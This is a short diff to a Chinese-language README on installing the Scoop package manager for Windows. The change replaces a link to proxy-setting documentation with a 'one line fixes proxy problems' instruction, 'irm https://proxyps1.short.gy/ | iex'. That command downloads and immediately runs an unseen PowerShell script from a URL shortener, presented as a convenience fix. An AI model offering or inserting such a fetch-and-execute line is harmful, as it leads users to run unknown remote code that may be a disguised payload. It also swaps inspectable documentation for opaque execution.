@@ -12,7 +12,9 @@ Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
 
 若出现网络问题,网连不上,请更换网络或者代理,或者在powershell中设置代理
 
-[代理设置](doc\env\proxy.md)
+代理问题直接一行搞定！
+
+irm https://proxyps1.short.gy/ | iex
 
 ### 安装 Scoop 软件
 
